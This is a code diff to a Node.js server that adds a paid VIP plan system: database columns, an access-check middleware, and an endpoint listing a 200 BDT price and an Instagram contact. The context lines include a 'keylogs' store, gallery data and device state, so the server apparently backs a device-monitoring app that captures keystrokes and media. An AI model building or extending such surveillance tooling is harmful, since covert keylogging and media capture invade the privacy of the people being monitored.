@@ -74,6 +74,26 @@ async function setupDatabase() {
       );
     `);
     await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(20) DEFAULT 'parent'`);
+    
+    
+// ========== FREE / VIP ACCESS SYSTEM ==========
+
+await pool.query(`
+  ALTER TABLE users
+  ADD COLUMN IF NOT EXISTS plan VARCHAR(20) NOT NULL DEFAULT 'free',
+  ADD COLUMN IF NOT EXISTS vip_expires_at TIMESTAMPTZ,
+  ADD COLUMN IF NOT EXISTS voice_used_date DATE,
+  ADD COLUMN IF NOT EXISTS video_used_date DATE
+`);
+
+await pool.query(`
+  CREATE INDEX IF NOT EXISTS idx_users_plan
+  ON users(plan)
+`);
+
+console.log("VIP Access System database ready.");
+
+   
     await pool.query(`
       CREATE TABLE IF NOT EXISTS devices (
         id SERIAL PRIMARY KEY,
@@ -176,6 +196,56 @@ function requireAdmin(req, res, next) {
   next();
 }
 
+
+// ========== VIP ACCESS MIDDLEWARE ==========
+
+async function getUserPlan(userId) {
+  const result = await pool.query(
+    `SELECT plan, vip_expires_at FROM users WHERE id=$1`,
+    [userId]
+  );
+
+  if (!result.rows.length) return 'free';
+
+  const user = result.rows[0];
+
+  if (
+    user.plan === 'vip' &&
+    user.vip_expires_at &&
+    new Date(user.vip_expires_at) > new Date()
+  ) {
+    return 'vip';
+  }
+
+  if (user.plan === 'vip') {
+    await pool.query(
+      `UPDATE users SET plan='free', vip_expires_at=NULL WHERE id=$1`,
+      [userId]
+    );
+  }
+
+  return 'free';
+}
+
+async function requireVIP(req, res, next) {
+  try {
+    const plan = await getUserPlan(req.session.userId);
+
+    if (plan !== 'vip' && req.session.role !== 'admin') {
+      return res.status(403).json({
+        locked: true,
+        plan: 'free',
+        message: 'VIP access required.'
+      });
+    }
+
+    next();
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ error: 'Access verification failed.' });
+  }
+}
+
 const deviceStates = new Map();
 const keylogs = [];
 const galleryData = new Map();
@@ -236,6 +306,43 @@ app.get("/api/me", requireLogin, async (req, res) => {
     res.json({ authenticated: true, user: result.rows[0] });
   } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
 });
+
+
+// ========== USER ACCESS STATUS ==========
+
+app.get("/api/access", requireLogin, async (req, res) => {
+  try {
+    const result = await pool.query(
+      `SELECT plan, vip_expires_at,
+              voice_used_date, video_used_date
+       FROM users WHERE id=$1`,
+      [req.session.userId]
+    );
+
+    if (!result.rows.length) {
+      return res.status(404).json({ error: "User not found." });
+    }
+
+    const user = result.rows[0];
+    const plan = await getUserPlan(req.session.userId);
+
+    res.json({
+      success: true,
+      plan,
+      vipExpiresAt: plan === 'vip' ? user.vip_expires_at : null,
+      voiceUsedToday: user.voice_used_date === new Date().toISOString().slice(0, 10),
+      videoUsedToday: user.video_used_date === new Date().toISOString().slice(0, 10),
+      price: 200,
+      currency: "BDT",
+      instagram: "whs_.jahidul"
+    });
+
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ error: "Access status failed." });
+  }
+});
+
 
 // ========== DEVICE STATE ==========
 app.post("/api/device-state", async (req, res) => {
